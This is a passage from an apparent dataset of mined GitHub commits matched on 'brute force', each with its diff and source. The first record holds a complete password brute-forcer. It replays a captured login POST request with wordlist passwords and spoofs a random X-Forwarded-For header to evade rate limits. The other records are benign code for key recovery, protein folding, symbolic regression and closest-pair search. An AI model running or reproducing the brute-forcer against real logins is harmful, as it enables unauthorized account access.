\t\t\tdata[x.split('=')[0]]=x.split('=')[1] \t \t \t \t \tip=\".\".join(str(random.randint(0, 255)) for _ in range(4)) \t \theaders_dict2['X-Forwarded-For']=ip \t \tresponse=requests.post(url, headers=headers_dict2, data=data) \t \t \t \tif str(invalid_credentials_output) in str(response.content): \t\tprint(f\"[-]{password}\") \telse: \t\tprint(\"\\n\") \t\tprint(\"\\n\") \t\tprint(\"(One) Password Found:\\n\") \t\tprint(f\"[+]{password}\\n\") \t\texit() request_file.close() wordlist_file.close() ","sourceWithComments":"#!\/usr\/bin\/env python3\n\nimport sys\nimport requests\nimport random\nimport time\n\n# WARNING!!!!!! THIS IS ONLY FOR EDUCATIONAL PURPOSES AND FOR PENTESTERS! DO NOT USE IT ILLEGALY!\n\nprint(\"\"\"\n\nCreated by 44h\n___________________________________________________________________________\n___________________________________________________________________________\n                   _____              _____                   \n                  \/    \/             \/    \/                   \n                 \/    \/             \/    \/        .           \n                \/    \/             \/    \/       .'|           \n               \/    \/             \/    \/       <  |           \n              \/    \/  __         \/    \/  __     | |           \n             \/    \/  |  |       \/    \/  |  |    | | .'''-.    \n            \/    '   |  |      \/    '   |  |    | |\/.'''. \\   \n           \/    '----|  |---. \/    '----|  |---.|  \/    | |   \n          \/          |  |   |\/          |  |   || |     | |   \n          '----------|  |---''----------|  |---'| |     | |   \n                     |  |               |  |    | '.    | '.  \n                    \/____\\             \/____\\   '---'   '---' \n___________________________________________________________________________\n___________________________________________________________________________\n\n\n\t\"\"\")\n\n\n#---------------------------------------------------------------------\n\ntry:\n\trequest_file = sys.argv[1].strip()\n\tpath_to_wordlist = sys.argv[2].strip()\nexcept IndexError:\n\tprint(\"\\nYou have to call the program like that: \\n\")\n\tprint(\"\\t\\033[1m\" + \"python3 program.py requestfile wordlist\\n\")\n\tprint(\"\\033[0m\" + \"The rest will be interactive.\")\n\texit()\n\n\n#Open the request file\ntry: \n\trequest_file = open(request_file, \"r\")\nexcept FileNotFoundError:\n\tprint(\"\\n The request file was not found, exiting...\")\n\texit()\n\n#Open the wordlist file\ntry: \n\twordlist_file = open(path_to_wordlist, \"r\")\nexcept FileNotFoundError:\n\tprint(\"\\n The wordlist file was not found, exiting...\")\n\texit()\n\n\n#Read the request file with new line characters\nrequest_file_content = repr(request_file.read())\n\nif request_file_content == \"\":\n\tprint(\"The request file is empty, exiting...\\n\")\n\texit()\n\n#Read the wordlist file without new line characters\nwordlist_file_content_per_file_not_stripped = wordlist_file.readlines()\nwordlist_file_content_per_file = [row.strip() for row in wordlist_file_content_per_file_not_stripped]\n\n#Format the content\nrequest_file_content = request_file_content[1:len(request_file_content)-1]\n\n#Get amount of rows of the request file \namount_of_rows_in_request_file = request_file_content.count('\\\\n') +1\n\n#Create a list with all rows\nrow_content_request_file = [row for row in request_file_content.split('\\\\n')]\n\ndef getRowContent(row):\n\treturn row_content_request_file[row-1]\n\n#Checking for POST method:\nif not getRowContent(1).startswith(\"POST\"):\n\tprint(\"The request method must be POST\")\n\texit()\n\nif (row_content_request_file[len(row_content_request_file)-1]) == \"\":\n\tdel row_content_request_file[len(row_content_request_file)-1]\n\n#---------------------------------------------------------------------\n\n#Get headers and put into a set\ndef headersEndAt():\n\trow = 0\n\tfor x in row_content_request_file:\n\t\tif x == \"\":\n\t\t\treturn row\n\t\trow+=1\n\nheaders = set()\n\nheadersAreOverInLine = headersEndAt()\n\nfor x in range(1, headersAreOverInLine):\n\theaders.add(row_content_request_file[x])\n\n#print(headers)\n#---------------------------------------------------------------------\n\n#Get parameters and choose two, one password and one username\n\narguments = []\n\nkeyandvalue = []\n\namount_of_arguments = row_content_request_file[len(row_content_request_file)-1].count('=')\n\npassword_argument = \"\"\n\nusername_or_email_argument = \"\"\n\nssl_encryption = False\n\ndef getArguments():\n\tglobal keyandvalue\n\tglobal arguments\n\tkeyandvalue = row_content_request_file[len(row_content_request_file)-1].split('&')\n\tfor x in keyandvalue:\n\t\targuments.append(x.split('=')[0])\n\t\ngetArguments()\n\ndef outputPossibleUsernamesAndPasswords():\n\tglobal arguments\n\tglobal username_or_email_argument\n\tglobal password_argument\n\tprint(\"\\n\")\n\tprint(\"Choose the argument for the username OR email BY NUMBER:\\n\")\n\titeratorUsername = 1\n\tfor x in arguments:\n\t\tprint(f\"[{iteratorUsername}] \\\"{x}\\\"\\n\")\n\t\titeratorUsername+=1\n\ttry:\n\t\tuinput = int(input(\"> \"))\n\texcept ValueError:\n\t\tprint(\"ERROR: Enter a number next time\")\n\t\texit()\n\tif uinput>len(arguments) or uinput == \"\":\n\t\tprint(\"Couldn't find that argument, exiting...\")\n\t\texit()\n\t\t#EDIT, WHEN STRING IS ENTERED, LEAVE\n\tusername_or_email_argument = arguments[uinput-1]\n\tprint(\"\\n\")\n\tprint(\"=================================================================\\n\")\n\tprint(\"Choose the argument for the password BY NUMBER:\\n\")\n\titeratorPassword = 1\n\tfor x in arguments:\n\t\tprint(f\"[{iteratorPassword}] \\\"{x}\\\"\\n\")\n\t\titeratorPassword+=1\n\ttry:\n\t\tpinput = int(input(\"> \"))\n\texcept ValueError:\n\t\tprint(\"ERROR: Enter a number next time\")\n\t\texit()\n\tif uinput == pinput or uinput == \"\":\n\t\tprint(\"WARNING: YOU SELECTED THE SAME FIELD TWICE!\\n\")\n\t\tprint(f\"So you selected the field {username_or_email_argument} for username and password, which makes no sense\\n\")\n\t\texit()\n\telif pinput > len(arguments):\n\t\tprint(\"Couldn't find the argument, exiting...\")\n\t\texit()\n\n\tpassword_argument = arguments[pinput-1]\n\tprint(\"\\n\")\n\t#print(f\"Selected: {username_or_email_argument} as a username\/email field and {password_argument} as a password field\")\n\noutputPossibleUsernamesAndPasswords()\n\n\nprint(\"\\n\")\nprint(\"=================================================================\\n\")\nprint(\"Which username do you want to authenticate as when bruteforcing through the password list:\\n\")\nusername = input(\"> \")\n\nprint(\"\\n\\n\")\nprint(\"=================================================================\\n\")\nprint(\"Now enter a text that you get when you enter invalid credentials:\\n\")\ninvalid_credentials_output = input(\"> \")\nprint(\"\\n\")\n\nprint(\"=================================================================\\n\")\nprint(\"Does it use SSL encryption?\\n\")\nprint(\"[1] yes\\n[2] no\")\ntemp3 = int(input(\"> \"))\nif temp3 == 1:\n\tssl_encryption = True\nelif temp3 == 2:\n\tssl_encryption = False\nelse:\n\tprint(\"That was not an option, exiting...\")\n\texit()\n\n\n#Formating headers, data and all the other stuff that is need\n\nheaders_dict = {}\nurl = \"\"\n\ndef convertHeaderSetIntoDict():\n\tglobal headers_dict\n\tfor x in headers:\n\t\theaders_dict[x.split(\":\", 1)[0]] = x.split(\": \", 1)[1]\n\n\n\nconvertHeaderSetIntoDict()\n\n\ndef concatenate_url():\n\tglobal headers_dict\n\tglobal ssl_encryption\n\tglobal url\n\tpartone = headers_dict[\"Host\"]\n\ttemp = row_content_request_file[0][5::]\n\tparttwo = temp.split(' ')[0]\n\turl = partone + parttwo\n\tif ssl_encryption == True:\n\t\turl = \"https:\/\/\" + url\n\telse:\n\t\turl = \"http:\/\/\" + url\n\nconcatenate_url()\n\nif url == \"\":\n\tprint(\"URL was \\\"\\\"\")\n\texit()\n\nprint(\"\\n\")\nprint(\"\\n\")\nprint(\"Stating to brute force\")\n\n#BRUTE FORCING:\n\nfor password in wordlist_file_content_per_file:\n\n\theaders_dict2 = headers_dict\n\t\n\t#print(headers_dict2)\n\t#print(\"\\n\\n\")\n\t#forging the data that is sent to the server\n\tdata = {}\n\ttemp = keyandvalue\n\tfor x in keyandvalue:\n\t\tif x.split('=')[0] == username_or_email_argument:\n\t\t\tdata[username_or_email_argument] = username\n\t\telif x.split('=')[0] == password_argument:\n\t\t\tdata[password_argument] = password\n\t\telse:\n\t\t\tdata[x.split('=')[0]] = x.split('=')[1]\n\t#print(\"\\n\")\n\t#print(f\"Url {url}\")\n\t#print(f\"Headers {headers_dict2}\")\n\t#print(f\"Data {data}\")\n\tip = \".\".join(str(random.randint(0, 255)) for _ in range(4))\n\t#print(ip)\n\theaders_dict2['X-Forwarded-For'] = ip\n\t#print(headers_dict2)\n\tresponse = requests.post(url, headers=headers_dict2, data=data)\n\t#print(response.content)\n\t#print(str(invalid_credentials_output))\n\t#print(str(response.content))\n\n\tif str(invalid_credentials_output) in str(response.content):\n\t\tprint(f\"[-] {password}\")\n\n\telse:\n\t\tprint(\"\\n\")\n\t\tprint(\"\\n\")\n\t\tprint(\"(One) Password Found:\\n\")\n\t\tprint(f\"[+] {password}\\n\")\n\t\texit()\n\n\nrequest_file.close()\nwordlist_file.close()\n\n\n#print(data)\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/EmyLIEUTAUD\/FST_Malware":{"b084168cb8dc63359f920e9b57efec018213ea3e":{"url":"https:\/\/api.github.com\/repos\/EmyLIEUTAUD\/FST_Malware\/commits\/b084168cb8dc63359f920e9b57efec018213ea3e","html_url":"https:\/\/github.com\/EmyLIEUTAUD\/FST_Malware\/commit\/b084168cb8dc63359f920e9b57efec018213ea3e","message":"Update brute_force.py","sha":"b084168cb8dc63359f920e9b57efec018213ea3e","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 40c043d..8c3a7d2 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -12,7 +12,7 @@ def compute(c):\n \n if __name__ == \"__main__\":\n     res = []\n-    chars = \"0123456789abcdef\"\n+    chars = \"0123456789abcdefghijklmnopqrstuvwxyz\"\n     for k in key:\n         possible_chars = []\n         for c in chars:\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n \n if __name__ == \"__main__\":\n     res = []\n-    chars = \"0123456789abcdef\"\n+    chars = \"0123456789abcdefghijklmnopqrstuvwxyz\"\n     for k in key:\n         possible_chars = []\n         for c in chars:\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["    chars = \"0123456789abcdef\""],"goodparts":["    chars = \"0123456789abcdefghijklmnopqrstuvwxyz\""]}],"source":"\nkey=[0x12, 0x15, 0x01, 0x04, 0x10, 0x0a, 0x04, 0x07, 0x12, 0x18, 0x15, 0x04, 0x07, 0x0a, 0x02, 0x19, 0x13, 0x12, 0x01, 0x15] compute_cache={} def compute(c): if compute_cache.get(c) is None: compute_cache[c]=(ord(c)*3+0x0d) % 0x1a return compute_cache[c] if __name__==\"__main__\": res=[] chars=\"0123456789abcdef\" for k in key: possible_chars=[] for c in chars: if compute(c)==k: possible_chars.append(c) res.append(possible_chars) for i in range(max(len(i) for i in res)): print(\"\".join(\" \" if i >=len(l) else l[i] for l in res)) ","sourceWithComments":"key = [0x12, 0x15, 0x01, 0x04,\n       0x10, 0x0a, 0x04, 0x07,\n       0x12, 0x18, 0x15, 0x04,\n       0x07, 0x0a, 0x02, 0x19,\n       0x13, 0x12, 0x01, 0x15]\n\ncompute_cache = {}\ndef compute(c):\n    if compute_cache.get(c) is None:\n        compute_cache[c] = (ord(c)*3+0x0d) % 0x1a\n    return compute_cache[c]\n\nif __name__ == \"__main__\":\n    res = []\n    chars = \"0123456789abcdef\"\n    for k in key:\n        possible_chars = []\n        for c in chars:\n            if compute(c) == k:\n                possible_chars.append(c)\n        res.append(possible_chars)\n    \n    for i in range(max(len(i) for i in res)):\n        print(\"\".join(\" \" if i >= len(l) else l[i] for l in res))\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/SigmaFold\/SigmaFold":{"d838245da17c04397ba079e2db4a201e5235750a":{"url":"https:\/\/api.github.com\/repos\/SigmaFold\/SigmaFold\/commits\/d838245da17c04397ba079e2db4a201e5235750a","html_url":"https:\/\/github.com\/SigmaFold\/SigmaFold\/commit\/d838245da17c04397ba079e2db4a201e5235750a","message":"minor update: updated set limit for brute force","sha":"d838245da17c04397ba079e2db4a201e5235750a","keyword":"brute force update","diff":"diff --git a\/placing-algorithm\/training-backend\/backend_main.py b\/placing-algorithm\/training-backend\/backend_main.py\nindex f6cc0ada..34e02139 100644\n--- a\/placing-algorithm\/training-backend\/backend_main.py\n+++ b\/placing-algorithm\/training-backend\/backend_main.py\n@@ -113,8 +113,8 @@ def save_and_upload(n, shape_list, seq_list):\n \n \n if __name__ == '__main__':\n-    set_limit =15\n-    n = 12\n+    set_limit =20\n+    n = 14\n     execution_time = {}\n     while n <= set_limit:\n         print(\"Adding data for length: \", n)\n","files":{"\/placing-algorithm\/training-backend\/backend_main.py":{"changes":[{"diff":"\n \n \n if __name__ == '__main__':\n-    set_limit =15\n-    n = 12\n+    set_limit =20\n+    n = 14\n     execution_time = {}\n     while n <= set_limit:\n         print(\"Adding data for length: \", n)\n","add":2,"remove":2,"filename":"\/placing-algorithm\/training-backend\/backend_main.py","badparts":["    set_limit =15","    n = 12"],"goodparts":["    set_limit =20","    n = 14"]}],"source":"\nimport sys import os sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))) from library.permutations_helper import * from library.native_fold import * from library.db_helper import * from library.shape_helper import * import pandas as pd import numpy as np import mmh3 import tabulate import json import time def exploitLength(length): seq_list=[] shape_list=[] seen_shapes=set() seq_df=pd.DataFrame(columns=[\"sequence_id\", \"sequence\", \"degeneracy\", \"length\", \"energy\", \"shape_mapping\", \"path\"]) shape_df=pd.DataFrame(columns=[\"shape_id\", \"min_degeneracy\", \"length\", \"min_energy\"]) if os.path.exists(f\"data\/folds\/fold_{length}.json\"): with open(f\"data\/folds\/fold_{length}.json\", \"r\") as f: paths=json.load(f) print(\"Loaded paths from json file\") else: paths=fold_n(length) with open(f\"data\/folds\/fold_{n}\", \"w\") as f: json.dump(paths, f) comb_array=perm_gen(length, 2) for sequence in comb_array: energy_heap=compute_energy(paths, sequence) folds_heap, degeneracy, energy=native_fold(energy_heap, return_energy=True) if degeneracy > 150: continue for _, fold in folds_heap: matrix=path_to_shape(fold) shape_id =serialize_shape(matrix) seq_hash=mmh3.hash64(sequence +str(shape_id), signed=True)[0] seq_df.loc[len(seq_df)]=[seq_hash, sequence, degeneracy, length, energy, shape_id, serialize_path(fold)] if shape_id not in seen_shapes: seen_shapes.add(shape_id) shape_df.loc[len(shape_df)]=[shape_id, degeneracy, length, energy] else: if degeneracy < shape_df.loc[shape_df[\"shape_id\"]==shape_id, \"min_degeneracy\"].iloc[0]: shape_df.loc[shape_df[\"shape_id\"]==shape_id, \"min_degeneracy\"]=degeneracy if energy < shape_df.loc[shape_df[\"shape_id\"]==shape_id, \"min_energy\"].iloc[0]: shape_df.loc[shape_df[\"shape_id\"]==shape_id, \"min_energy\"]=energy seq_df=seq_df[seq_df[\"shape_mapping\"] !=0] seq_df=seq_df.astype({\"sequence_id\": int, \"degeneracy\": int, \"length\": int}) shape_df=shape_df.astype({ \"min_degeneracy\": int, \"length\": int}) seq_df=seq_df.drop_duplicates() shape_df=shape_df.drop_duplicates() print(tabulate.tabulate(seq_df, headers=\"keys\", tablefmt=\"psql\")) for _, row in shape_df.iterrows(): shape_list.append(row.to_dict()) for _, row in seq_df.iterrows(): seq_list.append(row.to_dict()) return shape_list, seq_list def save_and_upload(n, shape_list, seq_list): \"\"\" Adds all the data to the database asynchronously\"\"\" with open(f\"data\/{n}\/seq_{n}.json\", \"w\") as f: json.dump(seq_list, f) with open(f\"data\/{n}\/shape_{n}.json\", \"w\") as f: json.dump(shape_list, f) try: upload_data(n) except Exception as e: print(e) print(\"Data unsuccesfully uploaded to supabase. Do this manually later.\") return print(\"Data saved to json files\") return if __name__=='__main__': set_limit=15 n=12 execution_time={} while n <=set_limit: print(\"Adding data for length: \", n) time_start=time.time() save_and_upload(n, *exploitLength(n)) time_end=time.time() execution_time[n]=time_end -time_start print(\"Time taken: \", time_end -time_start) n +=1 ","sourceWithComments":"import sys\nimport os\n# Set current working directory to be 3 levels above the current file\nsys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))  # THI\n\nfrom library.permutations_helper import *\nfrom library.native_fold import *\nfrom library.db_helper import *\nfrom library.shape_helper import *\n\nimport pandas as pd\nimport numpy as np\nimport mmh3\nimport tabulate\nimport json\n# from lib.tools import profile\nimport time\n\n\n\n\ndef exploitLength(length):\n    # Where we will store the dictionaries of data\n    seq_list = []\n    shape_list = []\n    seen_shapes = set()\n    seq_df = pd.DataFrame(columns=[\"sequence_id\", \"sequence\", \"degeneracy\", \"length\", \"energy\", \"shape_mapping\", \"path\"])\n    shape_df = pd.DataFrame(columns=[\"shape_id\", \"min_degeneracy\", \"length\", \"min_energy\"])\n\n    # NEW SPEEDUP TO AVOID REPEATED COMPUTATIONS\n    if os.path.exists(f\"data\/folds\/fold_{length}.json\"):\n        with open(f\"data\/folds\/fold_{length}.json\", \"r\") as f:\n            paths = json.load(f)\n            print(\"Loaded paths from json file\")\n    else:       \n        paths = fold_n(length)  # Get all the possible paths for a given length \n        # Save the paths to a json file\n        with open(f\"data\/folds\/fold_{n}\", \"w\") as f:\n            json.dump(paths, f)\n\n    comb_array = perm_gen(length, 2)  # Get all the possible sequences for a given length\n\n    # Iterate over all the possible combinations\n    for sequence in comb_array:\n        \n        energy_heap = compute_energy(paths, sequence)  # Compute the energy of all the possible paths\n        folds_heap, degeneracy, energy = native_fold(energy_heap, return_energy=True)  # Get all the low-energy folds for a given sequence\n\n        if degeneracy > 150 :  # Skip deg>200 cause that's useless    anyway\n            continue\n        # For each possible folds of the current sequence\n        for _, fold in folds_heap:\n\n            matrix = path_to_shape(fold) \n            shape_id  = serialize_shape(matrix)  # Get the shape_id of the current fold\n            seq_hash = mmh3.hash64(sequence + str(shape_id), signed=True)[0]  # Hash the sequence\n            seq_df.loc[len(seq_df)] = [seq_hash, sequence, degeneracy, length, energy, shape_id, serialize_path(fold)]  # Add the sequence to the sequence_df\n            \n            # For each fold update the shape_df\n            if shape_id not in seen_shapes:  # Will run if shape has not yet been added to database\n                seen_shapes.add(shape_id)\n                # add new shape to shape_df without using append\n                shape_df.loc[len(shape_df)] = [shape_id, degeneracy, length, energy]\n            else:\n                # Update min_degeneracy if necessary\n                if degeneracy < shape_df.loc[shape_df[\"shape_id\"] == shape_id, \"min_degeneracy\"].iloc[0]:\n                    shape_df.loc[shape_df[\"shape_id\"] == shape_id, \"min_degeneracy\"] = degeneracy\n\n                # Update min_energy if necessary\n                if energy < shape_df.loc[shape_df[\"shape_id\"] == shape_id, \"min_energy\"].iloc[0]:\n                    shape_df.loc[shape_df[\"shape_id\"] == shape_id, \"min_energy\"] = energy\n  \n    # remove all sequences with shape_mapping 0 \n    seq_df = seq_df[seq_df[\"shape_mapping\"] != 0]\n\n    # Get datatypes right in the dataframe\n    seq_df = seq_df.astype({\"sequence_id\": int, \"degeneracy\": int, \"length\": int})\n    shape_df = shape_df.astype({ \"min_degeneracy\": int, \"length\": int})\n\n    # Remove all duplicates from each dataframe\n    seq_df = seq_df.drop_duplicates()\n    shape_df = shape_df.drop_duplicates()\n\n    print(tabulate.tabulate(seq_df, headers=\"keys\", tablefmt=\"psql\"))\n\n    for _, row in shape_df.iterrows():\n        shape_list.append(row.to_dict())\n    # Package each row of seq_df into a dict and add to list\n    for _, row in seq_df.iterrows():\n        seq_list.append(row.to_dict())\n\n    return shape_list, seq_list\n\n\ndef save_and_upload(n, shape_list, seq_list):\n    \"\"\" Adds all the data to the database asynchronously\"\"\"\n\n    # Create a client\n    with open(f\"data\/{n}\/seq_{n}.json\", \"w\") as f:\n        json.dump(seq_list, f)\n    with open(f\"data\/{n}\/shape_{n}.json\", \"w\") as f:\n        json.dump(shape_list, f)\n    try:\n        upload_data(n)\n    except Exception as e:\n        print(e)\n        print(\"Data unsuccesfully uploaded to supabase. Do this manually later.\")\n        return\n    print(\"Data saved to json files\")\n    return\n    \n\n\n\nif __name__ == '__main__':\n    set_limit =15\n    n = 12\n    execution_time = {}\n    while n <= set_limit:\n        print(\"Adding data for length: \", n)\n        time_start = time.time()\n        save_and_upload(n, *exploitLength(n))\n        time_end = time.time()\n        execution_time[n] = time_end - time_start\n        print(\"Time taken: \", time_end - time_start)\n        n += 1 \n"}},"msg":"minor update: updated set limit for brute force"}},"https:\/\/github.com\/zykhoo\/AI-Feynman":{"7f9df3a727e4c0d42e7f966068a5799c82f394b0":{"url":"https:\/\/api.github.com\/repos\/zykhoo\/AI-Feynman\/commits\/7f9df3a727e4c0d42e7f966068a5799c82f394b0","html_url":"https:\/\/github.com\/zykhoo\/AI-Feynman\/commit\/7f9df3a727e4c0d42e7f966068a5799c82f394b0","message":"Update S_brute_force.py","sha":"7f9df3a727e4c0d42e7f966068a5799c82f394b0","keyword":"brute force update","diff":"diff --git a\/aifeynman\/S_brute_force.py b\/aifeynman\/S_brute_force.py\nindex 644450b..0ead66e 100644\n--- a\/aifeynman\/S_brute_force.py\n+++ b\/aifeynman\/S_brute_force.py\n@@ -49,25 +49,25 @@ def brute_force(pathdir, filename, BF_try_time, BF_ops_file_type, sep_type=\"*\",\n \n     shutil.copy2(pathdir+filename, \"mystery.dat\")\n     \n-    try:\n-        print(_get_resource(file_type))\n-    except:\n-        print(\"cant print get resource file type\")\n+#     try:\n+#         print(_get_resource(file_type))\n+#     except:\n+#         print(\"cant print get resource file type\")\n    \n-    try:\n-        print( _get_resource(\"arity2templates.txt\"))\n-    except:\n-        print(\"cant print get resource arity2templates\")\n+#     try:\n+#         print( _get_resource(\"arity2templates.txt\"))\n+#     except:\n+#         print(\"cant print get resource arity2templates\")\n         \n-    try:\n-        print(sigma)\n-    except:\n-        print(\"cant print sigma\")\n-\n-    try:\n-        print(band)\n-    except:\n-        print(\"cant print band\")\n+#     try:\n+#         print(sigma)\n+#     except:\n+#         print(\"cant print sigma\")\n+\n+#     try:\n+#         print(band)\n+#     except:\n+#         print(\"cant print band\")\n \n     data = \"'{}' '{}' mystery.dat results.dat {:f} {:f}\".format(_get_resource(file_type),\n                                                                 _get_resource(\n","files":{"\/aifeynman\/S_brute_force.py":{"changes":[{"diff":"\n \n     shutil.copy2(pathdir+filename, \"mystery.dat\")\n     \n-    try:\n-        print(_get_resource(file_type))\n-    except:\n-        print(\"cant print get resource file type\")\n+#     try:\n+#         print(_get_resource(file_type))\n+#     except:\n+#         print(\"cant print get resource file type\")\n    \n-    try:\n-        print( _get_resource(\"arity2templates.txt\"))\n-    except:\n-        print(\"cant print get resource arity2templates\")\n+#     try:\n+#         print( _get_resource(\"arity2templates.txt\"))\n+#     except:\n+#         print(\"cant print get resource arity2templates\")\n         \n-    try:\n-        print(sigma)\n-    except:\n-        print(\"cant print sigma\")\n-\n-    try:\n-        print(band)\n-    except:\n-        print(\"cant print band\")\n+#     try:\n+#         print(sigma)\n+#     except:\n+#         print(\"cant print sigma\")\n+\n+#     try:\n+#         print(band)\n+#     except:\n+#         print(\"cant print band\")\n \n     data = \"'{}' '{}' mystery.dat results.dat {:f} {:f}\".format(_get_resource(file_type),\n                                                                 _get_resource(\n","add":17,"remove":17,"filename":"\/aifeynman\/S_brute_force.py","badparts":["    try:","        print(_get_resource(file_type))","    except:","        print(\"cant print get resource file type\")","    try:","        print( _get_resource(\"arity2templates.txt\"))","    except:","        print(\"cant print get resource arity2templates\")","    try:","        print(sigma)","    except:","        print(\"cant print sigma\")","    try:","        print(band)","    except:","        print(\"cant print band\")"],"goodparts":[]}],"source":"\n import csv import os import shutil import subprocess import sys from subprocess import call import numpy as np import sympy as sp from sympy.parsing.sympy_parser import parse_expr from.resources import _get_resource def brute_force(pathdir, filename, BF_try_time, BF_ops_file_type, sep_type=\"*\", sigma=10, band=0): print(pathdir, filename) try_time=BF_try_time try_time_prefactor=BF_try_time file_type=BF_ops_file_type try: os.remove(\"results.dat\") except: pass try: os.remove(\"brute_solutions.dat\") except: pass try: os.remove(\"brute_constant.dat\") except: pass try: os.remove(\"brute_formulas.dat\") except: pass print(\"Trying to solve mysteries with brute force...\") print(\"Trying to solve{}\".format(pathdir+filename)) shutil.copy2(pathdir+filename, \"mystery.dat\") try: print(_get_resource(file_type)) except: print(\"cant print get resource file type\") try: print( _get_resource(\"arity2templates.txt\")) except: print(\"cant print get resource arity2templates\") try: print(sigma) except: print(\"cant print sigma\") try: print(band) except: print(\"cant print band\") data=\"'{}' '{}' mystery.dat results.dat{:f}{:f}\".format(_get_resource(file_type), _get_resource( \"arity2templates.txt\"), sigma, band) with open(\"args.dat\", 'w') as f: f.write(data) if sep_type==\"*\": try: subprocess.call([\"feynman_sr_mdl_mult\"], timeout=try_time) except: pass if sep_type==\"+\": try: subprocess.call([\"feynman_sr_mdl_plus\"], timeout=try_time) except: pass ","sourceWithComments":"# runs BF on data and saves the best RPN expressions in results.dat\n# all the .dat files are created after I run this script\n# the .scr are needed to run the fortran code\n\nimport csv\nimport os\nimport shutil\nimport subprocess\nimport sys\nfrom subprocess import call\n\nimport numpy as np\nimport sympy as sp\nfrom sympy.parsing.sympy_parser import parse_expr\n\nfrom .resources import _get_resource\n\n# sep_type = 3 for add and 2 for mult and 1 for normal\n\n\ndef brute_force(pathdir, filename, BF_try_time, BF_ops_file_type, sep_type=\"*\", sigma=10, band=0):\n    print(pathdir, filename)\n    try_time = BF_try_time\n    try_time_prefactor = BF_try_time\n    file_type = BF_ops_file_type\n\n    try:\n        os.remove(\"results.dat\")\n    except:\n        pass\n\n    try:\n        os.remove(\"brute_solutions.dat\")\n    except:\n        pass\n\n    try:\n        os.remove(\"brute_constant.dat\")\n    except:\n        pass\n\n    try:\n        os.remove(\"brute_formulas.dat\")\n    except:\n        pass\n\n    print(\"Trying to solve mysteries with brute force...\")\n    print(\"Trying to solve {}\".format(pathdir+filename))\n\n    shutil.copy2(pathdir+filename, \"mystery.dat\")\n    \n    try:\n        print(_get_resource(file_type))\n    except:\n        print(\"cant print get resource file type\")\n   \n    try:\n        print( _get_resource(\"arity2templates.txt\"))\n    except:\n        print(\"cant print get resource arity2templates\")\n        \n    try:\n        print(sigma)\n    except:\n        print(\"cant print sigma\")\n\n    try:\n        print(band)\n    except:\n        print(\"cant print band\")\n\n    data = \"'{}' '{}' mystery.dat results.dat {:f} {:f}\".format(_get_resource(file_type),\n                                                                _get_resource(\n                                                                    \"arity2templates.txt\"),\n                                                                sigma,\n                                                                band)\n\n    with open(\"args.dat\", 'w') as f:\n        f.write(data)\n\n    if sep_type == \"*\":\n        try:\n            # subprocess.call([\"feynman_sr2\"], timeout=try_time)\n            subprocess.call([\"feynman_sr_mdl_mult\"], timeout=try_time)\n        except:\n            pass\n    if sep_type == \"+\":\n        try:\n            # subprocess.call([\"feynman_sr3\"], timeout=try_time)\n            subprocess.call([\"feynman_sr_mdl_plus\"], timeout=try_time)\n        except:\n            pass\n"}},"msg":"Update S_brute_force.py"}},"https:\/\/github.com\/archmans\/Tucil2_13521010_13521014":{"5c37616a3cc151907270937c347de027dac32453":{"url":"https:\/\/api.github.com\/repos\/archmans\/Tucil2_13521010_13521014\/commits\/5c37616a3cc151907270937c347de027dac32453","html_url":"https:\/\/github.com\/archmans\/Tucil2_13521010_13521014\/commit\/5c37616a3cc151907270937c347de027dac32453","message":"update brute force","sha":"5c37616a3cc151907270937c347de027dac32453","keyword":"brute force update","diff":"diff --git a\/bruteForce.py b\/bruteForce.py\nindex f05647b..4546303 100644\n--- a\/bruteForce.py\n+++ b\/bruteForce.py\n@@ -5,15 +5,17 @@\n \n #Find closest pair of points in a set of x,y,z coordinates\n #Generate random points based on n input and insert to list\n-def generate_points(n):\n+def generate_points(n, m):\n+  #complexity O(n)\n     points = []\n     for i in range(n):\n-        x = random.randint(0,100)\n-        y = random.randint(0,100)\n-        z = random.randint(0,100)\n-        points.append([x,y,z])\n+        temp = []\n+        for j in range(m):\n+            temp.append(random.randint(0,1000))\n+        points.append(temp)\n     return points\n \n+\n n = int(input(\"Enter number of points: \"))\n points = generate_points(n)\n print(points)\n@@ -36,8 +38,13 @@ def generate_points(n):\n \n #Find distance between two points\n def distance(p1,p2):\n-    return math.sqrt((p1[0]-p2[0])**2 + (p1[1]-p2[1])**2 + (p1[2]-p2[2])**2)\n-\n+  #complexity O(1)\n+    global counterEuclidean\n+    counterEuclidean+=1\n+    result = float(0)\n+    for i in range(len(p1)):\n+        result += (p1[i]-p2[i])**2\n+    return math.sqrt(result)\n #Find closest pair of points\n \n #color the closest pair of points and draw the line between them\n","files":{"\/bruteForce.py":{"changes":[{"diff":"\n \n #Find closest pair of points in a set of x,y,z coordinates\n #Generate random points based on n input and insert to list\n-def generate_points(n):\n+def generate_points(n, m):\n+  #complexity O(n)\n     points = []\n     for i in range(n):\n-        x = random.randint(0,100)\n-        y = random.randint(0,100)\n-        z = random.randint(0,100)\n-        points.append([x,y,z])\n+        temp = []\n+        for j in range(m):\n+            temp.append(random.randint(0,1000))\n+        points.append(temp)\n     return points\n \n+\n n = int(input(\"Enter number of points: \"))\n points = generate_points(n)\n print(points)\n","add":7,"remove":5,"filename":"\/bruteForce.py","badparts":["def generate_points(n):","        x = random.randint(0,100)","        y = random.randint(0,100)","        z = random.randint(0,100)","        points.append([x,y,z])"],"goodparts":["def generate_points(n, m):","        temp = []","        for j in range(m):","            temp.append(random.randint(0,1000))","        points.append(temp)"]},{"diff":"\n \n #Find distance between two points\n def distance(p1,p2):\n-    return math.sqrt((p1[0]-p2[0])**2 + (p1[1]-p2[1])**2 + (p1[2]-p2[2])**2)\n-\n+  #complexity O(1)\n+    global counterEuclidean\n+    counterEuclidean+=1\n+    result = float(0)\n+    for i in range(len(p1)):\n+        result += (p1[i]-p2[i])**2\n+    return math.sqrt(result)\n #Find closest pair of points\n \n #color the closest pair of points and draw the line between them\n","add":7,"remove":2,"filename":"\/bruteForce.py","badparts":["    return math.sqrt((p1[0]-p2[0])**2 + (p1[1]-p2[1])**2 + (p1[2]-p2[2])**2)"],"goodparts":["    global counterEuclidean","    counterEuclidean+=1","    result = float(0)","    for i in range(len(p1)):","        result += 